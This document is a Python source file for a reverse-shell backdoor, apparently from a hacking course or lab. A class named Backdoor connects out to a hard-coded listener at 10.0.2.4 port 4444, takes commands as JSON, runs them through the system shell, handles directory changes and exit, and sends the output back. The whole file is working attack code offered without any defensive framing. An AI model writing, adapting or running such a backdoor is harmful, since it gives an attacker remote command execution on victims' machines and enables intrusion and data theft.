#!/usr/bin/env python

import socket
import subprocess
import json
import os

class Backdoor:
    def __init__(self,ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # connection.connect(("10.0.2.4", 4444))
        self.connection.connect((ip, port))

    def send_json(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def receive_json(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(2048)
                return json.loads(json_data)
            except ValueError:
                continue

    def change_directory(self, path):
        os.chdir(path)
        return "[+] Changing working directory to " + path

    def execute_sys_command(self, command):
        return subprocess.check_output(command, shell=True)

    def run(self):
        while True:
            # command = self.connection.recv(2048).decode()
            command = self.receive_json()

            if(command[0].lower() == "exit"): #exit program
                self.connection.close()
                exit()

            elif(command[0] == "cd" and (len(command) > 1) ):
                command_result = self.change_directory(command[1])
            else:
                command_result = self.execute_sys_command(command)
                # self.connection.send(command_result)
                self.send_json(command_result)

        self.connection.close()

my_Backdoor = Backdoor("10.0.2.4", 4444)
my_Backdoor.run()
